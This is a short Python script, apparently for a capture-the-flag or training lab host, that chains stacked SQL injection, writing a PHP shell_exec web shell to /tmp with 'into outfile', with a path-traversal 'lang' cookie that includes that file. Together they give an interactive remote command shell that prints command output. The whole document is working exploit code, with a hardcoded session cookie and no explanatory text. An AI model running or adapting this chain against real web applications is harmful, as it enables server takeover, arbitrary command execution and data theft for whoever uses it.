import requests
import urllib.parse
import calendar
import time

#-----------------------------------------code inject
while 1:
    current_GMT=time.gmtime()
    filename=str(calendar.timegm(current_GMT))
    code_inject='<?php echo shell_exec("{}");?>'.format(input("Type Command: "))
    sqli="; select '{}' into outfile '/tmp/{}.html'".format(code_inject,filename)
    sqli=urllib.parse.quote(sqli)

    url = "http://magazin.cyberjutsu-lab.tech:8092/index.php?id=1"+sqli
    cookies = {"lang": "en.html", "PHPSESSID": "5d20272073227db6b3757cb0c1078e83"}
    headers = {"sec-ch-ua": "\"-Not.A/Brand\";v=\"8\", \"Chromium\";v=\"102\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "http://magazin.cyberjutsu-lab.tech:8092/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
    requests.get(url, headers=headers, cookies=cookies)

    #----------------------------path traversal --> RCE
    url = "http://magazin.cyberjutsu-lab.tech:8092"
    path_traversal="../../../../../../tmp/{}".format(filename)
    cookies = {"lang": path_traversal, "PHPSESSID": "5d20272073227db6b3757cb0c1078e83"}
    headers = {"sec-ch-ua": "\"-Not.A/Brand\";v=\"8\", \"Chromium\";v=\"102\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
    data=requests.get(url, headers=headers, cookies=cookies)
    data=data.text.split("<body>")[1]
    data=data.split("<div")[0]
    print(data)